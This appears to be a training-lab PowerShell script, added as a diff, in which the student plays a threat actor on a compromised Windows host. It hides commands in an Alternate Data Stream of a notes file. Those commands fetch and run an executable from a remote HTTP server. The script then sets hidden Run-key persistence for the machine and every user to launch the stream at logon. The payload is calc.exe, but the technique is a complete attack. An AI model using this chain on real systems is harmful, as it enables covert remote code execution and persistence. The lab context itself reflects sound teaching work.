@@ -1,0 +1,67 @@
+<#
+###Pre-Requisites to be performed on Linux OpsStation
+
+#Creating the Payload Directory
+sudo mkdir /payloads
+
+#Modding permission on payload directory
+sudo chmod 777 /payloads
+
+#Adding the payload (calc.exe) and modifying its permissions
+scp <Windows_IP>:/C:/Windows/System32/calc.exe /payloads/
+chmod 777 /payloads/calc.exe
+
+#move to root drive
+cd /
+
+#Starting HTTP Server on Port 8000
+python2 -m SimpleHTTPServer 8000
+
+#Replace with Linux IP via Find and Replace
+ex: <Linux_IP> -> 127.0.0.1
+#>
+
+#On Windows OpsStation or  Admin-Station 
+
+#Creating a normal file with data
+Set-Content -Path C:\Users\student\Desktop\notes.txt -Value "You can change directories in a CommandPrompt or PowerShell terminal by utilizing the command 'cd'"
+Add-Content -Path C:\Users\student\Desktop\notes.txt -Value "The command 'cd' stands for Change Directory."
+Add-Content -Path C:\Users\student\Desktop\notes.txt -Value "`*My mind is blown away by this revalation"
+Add-Content -Path C:\Users\student\Desktop\notes.txt -Value "`*Being a sysadmin is complicated if i have to keep up this amount of knowledge"
+Add-Content -Path C:\Users\student\Desktop\notes.txt -Value "`* `#L33t_H@x0r"
+
+<#
+###SCENARIO###
+*You are a malicious Cyber Threat Actor (CTA), and have just gained access to a Windows asset.
+*You have already performed a Priviledge Esculation (PrivEsc) on the machine and have Admin Creds.
+*Base on Open Source Intelligence (OSINT) Recon, you have determined that the SysAdmins of the network are not of the utmost quality.
+*They're internal security seems to be on point, however you noticed that they heavily utilize Alternate Data Streams (ADS) on their domain for administrative purposes.
+*You have noticed that the Notes.txt file in Student's Desktop is a prime location for installing your ADS.
+*For the mission to be successfull, you will have to create an ADS along with a persistance mechanism to execute what's in the ADS.
+#>
+
+#View the newly created Notes file
+Get-Content -Path C:\Users\student\Desktop\notes.txt
+Get-FileHash -Path C:\Users\student\Desktop\notes.txt -Algorithm MD5
+
+#Adding an ADS to the 'notes' file
+Add-Content -PassThru C:\Users\student\Desktop\notes.txt -Value 'wget 10.50.24.35:8080/calc.exe -outfile C:\Windows\Temp\calc.exe ' -Stream 'script'
+Add-Content -PassThru C:\Users\student\Desktop\notes.txt -Value 'sleep 5' -Stream 'script'
+Add-Content -PassThru C:\Users\student\Desktop\notes.txt -Value 'start-process C:\Windows\Temp\calc.exe' -Stream 'script'
+
+#View Notes File (again)
+Get-Content -Path C:\Users\student\Desktop\notes.txt
+Get-FileHash -Path C:\Users\student\Desktop\notes.txt -Algorithm MD5
+
+#View the ADS you created
+Get-Content -Path C:\Users\student\Desktop\notes.txt -Stream script
+
+#Create Persistence in Machine Run Key
+New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name Machine_ADS_Persists -PropertyType String -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  -windowstyle hidden -noprofile -command "Get-content C:\Users\student\Desktop\notes.txt -Stream script | foreach { powershell -windowstyle hidden -noprofile $_ }"' -Force -ErrorAction SilentlyContinue
+
+#Create Persistence in Every User's Run Key
+New-ItemProperty -Path Registry::HKey_Users\*\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name User_ADS_Persists -PropertyType String -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -noprofile -command "Get-content C:\Users\student\Desktop\notes.txt -Stream script | foreach { powershell -windowstyle hidden -noprofile $_ }"' -Force -ErrorAction SilentlyContinue
+
+#Executing the information from the ADS
+Get-Content C:\Users\student\Desktop\notes.txt -Stream script | foreach { powershell -windowstyle hidden -noprofile $_ }
+
